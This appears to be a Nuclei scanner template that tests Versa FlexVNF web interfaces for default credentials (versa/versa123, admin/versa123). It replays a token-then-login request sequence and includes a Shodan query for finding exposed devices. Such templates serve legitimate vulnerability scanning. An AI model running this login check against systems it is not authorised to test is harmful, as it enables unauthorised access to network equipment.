http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: xsrf_token
    part: header
    regex:
    - '(?i)Set-Cookie: XSRF-TOKEN=([A-Za-z0-9_.-]+)'
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - '{"username":"{{username}}","error":false}'
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - versa123
    - versa123
    username:
    - versa
    - admin
  raw:
  - 'GET /authenticate HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /authenticate HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json;charset=UTF-8

    CSRF-Token: {{xsrf_token}}


    {"username":"{{username}}","password":"{{password}}"}

    '
  stop-at-first-match: true
id: versa-flexvnf-default-login
info:
  author: c-sh0
  classification:
    cpe: cpe:2.3:o:versa-networks:versa_operating_system:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: Versa FlexVNF contains a default login vulnerability. An attacker can
    obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  metadata:
    max-request: 4
    product: versa_operating_system
    shodan-query: title:"Flex VNF Web-UI"
    vendor: versa-networks
    verified: true
  name: Versa FlexVNF - Default Login
  reference:
  - https://versa-networks.com/products/
  severity: high
  tags: default-login,versa,flexvnf,vuln
